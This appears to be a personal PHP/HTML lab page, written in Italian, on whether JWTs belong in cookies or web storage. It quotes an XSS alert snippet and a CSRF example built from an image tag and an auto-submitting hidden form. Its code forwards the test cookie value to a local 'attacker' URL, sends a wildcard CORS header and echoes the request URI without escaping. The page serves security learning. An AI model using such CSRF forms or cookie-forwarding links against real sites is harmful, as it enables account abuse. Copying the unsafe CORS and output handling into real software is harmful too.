<?php
	
	session_start();

	header('Access-Control-Allow-Origin: *');  

	// set cookie and localstorage to test
	$cookie_value = "sgana1";
	$cookie_name = "test-cookie";

	$http_only = ($_GET['http_only']) ? true : false;
	$https_secure = ($_GET['https_secure']) ? true : false;

	/*$http_only_changed = ($_SESSION['http_only'] !== $http_only);
	$_SESSION['http_only'] = $http_only;*/

	$https_secure_changed = ($_SESSION['https_secure'] !== $https_secure);
	$_SESSION['https_secure'] = $https_secure;

	function hackHost($ssl = false){
		$obj = new StdClass();
		
		$hackHost = 'http://host.localenomis/';
		$hackHost = 'host.localenomis';
		$protocol = ($ssl) ? 'https://' : 'http://' ;
		$path = '/Test/Security/CookiesVsStorage/';
		$url = $protocol.$hackHost.$path;
		
		// per facilita' passo all'hacker l'host a cui chiamare:
		// naturalmente l'hacker saprebbe da solo come reindirizzarsi, 
		// oppure proverebbe la CSRF su un insieme di siti che a lui  interessano.
		// Io l'ho aggiunto solo per comodita'.
		// 
		$obj->actualUrl = urlencode("http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]");
		global $cookie_name;
		$qs = '?attackTo='.$obj->actualUrl . "&cookieToSteal=".urlencode($_COOKIE[$cookie_name]);
		
		$url .= $qs;
		$obj->href = sprintf('<a href="%s">%s</a>', $url, $url);
		$obj->url = $url;
		
		return $obj;
	}

	$hacker = hackHost();


	function setPhpCookies(){
		$headers = apache_request_headers();
		global $cookie_name;
		global $cookie_value;
		global $http_only;
		global $https_secure;
		$cookie = setcookie($cookie_name, $cookie_value, time()+3600, "/", $headers['Host'], $https_secure, $http_only );
		if(!$cookie){
			throw new Exception("Errore: impossibile impostare i cookie via php.", 1);
		}else{
			?>
			<script>
				// alert('cookie setted via php!');
			</script>
			<?php
		}
	}

	function setJavascriptLocalStorage(){
		echo "storage";
	}

	// try{
		setPhpCookies();
	// }catch(Exception $e){
	// 	echo "bellaaaaaa";
	// 	echo $e->getMessage();
	// 	// exit 0;
	// 	return;
	// }
?>

<!DOCTYPE>
<!DOCTYPE html>
<html>
<head>
	<title>Cookies VS Storage</title>
</head>
<style>
	body{
		background-color: rgba(150,170,210,0.5);
		margin: 1em auto 2em;
		max-width: 800px;
		text-align: justify;
		padding: 0 2em;
	}
	h1,h2{
		display: block;
		border-bottom: 2px solid purple;
	}
	xmp{
		background-color: rgba(50,70,10,0.5);
	}
	p {
		margin-top: 1em;
	}
	.warn{
		display: block;
		margin: 2em;
		background-color: orange;
		opacity: 0.5;
	}
</style>
<body>

<p>
	Nel salvataggio dei tokens o di altri parametri (ad esempio quando uso JWT) posso espormi ad attacchi di vario genere, tra i piu famosi **CSRF** e **XSS**. Risulta pertanto importante capire dove e' meglio salvare i token per non vanificare gli sforzi impiegati per migliorare la sicurezza!!<br>
	Quanto sto per testare e' tratto da <a href="https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage">https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage</a>.
</p>

<p>
	I luoghi in cui salvare dei tokens sono i cookies o il web storage: entrambi sono facilmente implementabili, pertanto la selezione avviene solo ed esclusivamente in base alla sicurezza!<br/>
</p>




<h1>Web Storage</h1>
<p>
	I punti principali sono:
	<ul>
		<li>localStorage/sessionStorage sono accessibili tramite javascript sullo stesso dominio</li>
	</ul>

	pertanto ogni javascript che gira sul sito e' soggetto a attacchi **XSS**, quali ad esempio 
	<xmp>
		<script>alert('You are Hacked');</script>
	</xmp>

	dentro a un form. <br/>
	In teoria si potrebbe prevenire mediante `escape encode` tutti i dati non sicuri, ma tenendo presente che quasi sempre si usano strumenti/librerie di terze parti risulta rischioso: basta che anche e solo una di queste librerie importate abbia questo codice malevolo perche' un hacker possa ottenere i dati del web storage o dei cookies qualora non adotti tecniche particolari prevenire.<br/>
	As a storage mechanism, Web Storage does not enforce any secure standards during transfer. Whoever reads Web Storage and uses it must do their due diligence to ensure they always send the JWT over `HTTPS` and never `HTTP`.
</p>

<h1>Cookies</h1>
<p>
	quando utilizzati con `HttpOnly` flag non sono accessibili tramite Javascript e risultano quindi immuni ad XSS. Si puo' inoltre aggiungere la flag `Secure` per garantire che i cookie siano inviati solo via `HTTPS`. Questa e' una delle ragioni per le quali i cookie possono risultare relativamente affidabili. Cookies as a storage mechanism do not require state to be stored on the server if you are storing a JWT in the cookie. This is because the JWT encapsulates everything the server needs to serve the request.
</p>
<p>
	Tuttavia i cookies sono vulnerabili ad attacchi di tipo cross-site request forgery (CSRF), che avviene quando un sito malevolo, email, immagine o altro, comporta un'azione del web browser su un sito non sicuro verso un sito per il quale siamo loggati tramite cookies. I punti principale dei cookies sono:
	<ul>
		<li>Un cookie puo' essere mandato solo al dominio in cui e' permesso (per default e' il dominio che ha originariamente impostato il cookie)</li>
		<li>Un cookie viene mandato al dominio in cui e' permesso **indipendentemente** dal dominio di origine</li>
		<li>i cookies possono essere letti via Javascript solo dagli script che runnano sul dominio stesso (vedi <a href="#xsrf-token">Soluzioni xsrf-token</a>)
	</ul>
	Il primo punto e' un dato di fatto, che puo' avere pro e contro, ma e' il secondo che porta al vero problema: se sono loggato via cookies su `galaxies.com`(che quindi ha impostato dei cookie relativi a se stesso dominio) e poi vado su un sito malevolo `hahagonnahackyou.com` che contiene un hack al `galaxies.com`, ad esempio

	<xmp>
		<body>
		 
		  <!– CSRF with an img tag –>
		 
		  <img href="http://galaxies.com/stars/pollux?transferTo=tom@stealingstars.com" />
		 
		  <!– or with a hidden form post –>
		 
		  <script type="text/javascript">
		  $(document).ready(function() {
		    window.document.forms[0].submit();
		  });
		  </script>
		 
		  <div style="display:none;">
		    <form action="http://galaxies.com/stars/pollux" method="POST">
		      <input name="transferTo" value="tom@stealingstars.com" />
		    <form>
		  </div>
		</body>
	</xmp>

	in entrambi i casi i cookie saranno spediti a `galaxies.com`, anche se mi trovato su `hahagonnahackyou.com`, realizzando cosi' la CSRF. In questo caso `web storage` sembra piu' sicuro in quanto non viene automaticamente inviato, ma come detto precedentemente un hackinject di codice javascript potrebbe recuperare tranquillamente i dati della sessionStorage e collezionarli in un sito esterno.
</p>

<h1>Test</h1>
<p>
	Per testare il tutto, ho impostato un cookie `test-cookie` e una variabile `test-storage` in localStorage relativamente a questa pagina e per questo host. Il codice risulta semplice, pertanto non lo scrivo, ma puoi sincerarti della presenza dei cookie guardando gli header di questa pagina.
</p>
<p>
	Un test ha senso se si prova tutto, pertanto oltre a testare la CSFR, voglio anche provare le opzioni genericamente consigliate per i cookie, ovver `secure` per limitare ad https e `http_only` per rendere i cookie non accessibili via Javascript.
	<br/>
	Dalla presenza o meno delle spunte nel form sottostante capisco che configurazione ho:
	<form action="" method="GET">
		<fieldset>
	 		<legend>Cookie Options</legend><br>
	 		<input type="checkbox" name="http_only" value="true" <?php if($http_only) echo 'checked="checked"';?>/> `http_only`
	 		<?php
	 			//if($http_only_changed) echo "<div class=\"warn\">http_only modificato</div>";
	 		?>
	 		<br /> 
	 		<input type="checkbox" name="https_secure" value="true" <?php if($https_secure) echo 'checked="checked"';?>/> `secure` 
	 		<?php
	 			if($https_secure_changed) echo "<div class=\"warn\">secure modificato</div>";
	 		?>
		</fieldset>
		<input type="submit" /> 
	</form>
	<?php
		if($https_secure_changed /*|| $http_only_changed*/) echo "<div class=\"warn\">Alcuni parametri sono stati cambiati rispetto alla visita precedente: <br/>per renderli effettivi eseguire un altro submit del form.</div>";
	?>
</p>
<p>
	tramite javascript anzitutto visualizzo i cookies presenti in questo dominio:
	<div>
		Via PHP:<br/>
		<?php
		if(!isset($_COOKIE[$cookie_name])) {
		    echo "Cookie named '" . $cookie_name . "' is not set!<br/>";
		} else {
		    echo "Cookie '" . $cookie_name . "' is set!<br/>";
		    echo "Value is: " . $_COOKIE[$cookie_name]."<br/>";
		}
		?>
		Via Javascript:<br/>
		<script type="text/javascript">
			console.log(document.cookie);
			document.write(document.cookie);
		</script>
	</div>
</p>
<p>
	Analizziamo i risultati PHP e JAVASCRIPT in base alle opzioni:
	<ul>
		<li>
			<b>http_only</b><br/>
			- se impostato il cookie e' leggibile solo via PHP (quindi anche negli header), mentre NON e' leggibile via JAVASCRIPT. In ogni caso il PHPSESSID perche' per lui non ho impostato alcun http_only.<br/>
			- se non e' impostato, il cookie risulta accessibile sia via PHP che via JAVASCRIPT.
			<p>
				E' interessante notare che essendo questa una restrizione su javascript, viene attivata immediatamente, senza bisogno di un secondo submit per svolgere un refresh della pagina.<br/>
				In ogni caso i cookie vengono trasmessi sia in response-header che in request-header.
			</p>
		</li>
		<li>
			<b>secure (https)</b>
			- se impostato allora il cookie non e' leggibile via HTTP, ma solo quando utilizzo il protocollo HTTPS, garantendo cosi' la sua trasmissione solo quando questa e' sicura.
		</li>
		<p>
			Questa opzione per essere attuata richiede due submit, infatti:
			- se inizialmente avevo impostato i cookie, nell'header-request e header-response del primo submit i cookie sono presenti; questo perche' nello svolgere la richiesta il browser non sa ancora che il server impostera' i `secure` su tali cookie, pertanto visto che li ha si limita a mandarli. Sono inoltre presenti nell'header-response in quanto il server li imposta via PHP ogni volta, pur concedendo o meno le opzioni.
			- in ogni caso al secondo submit sono presenti nel response-header (per quanto scritto alla riga sopra) ma NON sono presenti nel request-header: infatti col primo submit il server dice al browser: "guarda che ora quei cookie hanno impostato secure, pertanto puoi mandarmeli solo via https". Dal secondo submit in poi il client sa di poterli mandare solo con connessione https.
		</p>
		<p>
			Quando la disabilito (e sono in HTTP) invece:
			- al primo submit riesco a leggere i cookie solo via JAVASCRIPT(se non ho impostato http_only), ma non via PHP: infatti PHP legge solamente i $_COOKIE che ha ricevuto nel request-header e li stampa, ma avendo appena rimosso `secure` il request-header del primo submit non puo' ancora contenere tale cookie, perche' il browser non sapeva ancora di doverlo inserire! la lettura via JAVASCRIPT invece avviene sempre sulla base dello stato attuale. Per dirla meglio: PHP legge i cookie durante la fase di REQUEST, mentre JAVASCRIPT legge i cookie nella fase di RESPONSE (in cui quindi il broser sa gia' cosa il server gli ha ordinato di fare coi cookie).
		</p>
	</ul>
	In ogni caso il PHPSESSID perche' per lui non ho impostato alcun http_only o secure.<br/>
	<p>
		Quando la connessione e' stabilita via HTTPS allora questo non e' dissimile da HTTP nei confronti dell'opzione `http_only`.
	</p>
</p>
<p>
	Per svolgere il CSRF test ho impostato un'opportuna pagina sull'host **<?php echo $hacker->url;?>**, che pertanto ricopre il ruolo di `hahagonnahackyou.com`.
	<br/> 
	Pertanto per ottenere i risultati andare alla pagina:
	<div><?php echo $hacker->href;?></div>
</p>



<h1>Soluzioni</h1>

<h2 id="xsrf-token">XSRF-TOKEN</h2>
<p>
	Poiche' i cookie per il dominio `galaxies.com` possono essere letti solo da Javascript che runnano su di esso, una soluzione adottata da AngularJS e' la seguente:
</p>
<p>
	`galaxies.com` puo' aggiungere ai cookie un `XSRF-TOKEN`, poi un javascript di quel dominio puo' allora leggere tale valore e incorporarlo nell'header `X-XSRF-TOKEN` per una successiva richiesta a `galaxies.com`: quando questa viene eseguita a `galaxies.com`, questi recupera il cookie `XSRF-TOKEN` e l'header `XSRF-TOKEN`.<br/>
	Se questi dati recuperati sono uguali, allora `galaxies.com` puo' essere sicuro che la richiesta arrivi da javascript che lavora direttamente sulla pagina di `galaxies.com` stesso! Infatti il javascript sul sito `hahagonnahackeyou.com` non puo' in alcun modo reperire il cookie `XSRF-TOKEN` e di conseguenza non puo' aggiungerlo a una chiamata ajax verso `galaxies.com`, che al di la di questi `XSRF-TOKEN` potrebbe fallire ugualmente, se `galaxies.com` non ha abilitato Allow Origin verso tutti o verso almeno `hahagonnahackyou.com`.
</p>
<p>
	Questo ragionamento e' valido solo qualora l'utente utilizzi un browser sicuro, oppure fino a quando un hacker non trova vulnerabilita' nel browser ed entra nel pc dell'utente: tutto e' basato sulla certezza che le limitazioni del browser non siano eludibili!
</p>


<h1>Conclusioni</h1>
<p>
	JWTs are an awesome authentication mechanism. They give you a structured way to declare users and what they can access. They can be encrypted and signed for to prevent tampering on the client side, but the devil is in the details and where you store them. Stormpath recommends that you store your JWT in cookies for web applications, because of the additional security they provide, and the simplicity of protecting against CSRF with modern web frameworks. HTML5 Web Storage is vulnerable to XSS, has a larger attack surface area, and can impact all application users on a successful attack.
</p>




<script type="text/javascript">
	var links = document.querySelectorAll('a[href]');
	for(var i in links){
		var el = links[i];
		if(el.setAttribute) el.setAttribute("target","_blank");
	}
</script>

</body>
</html>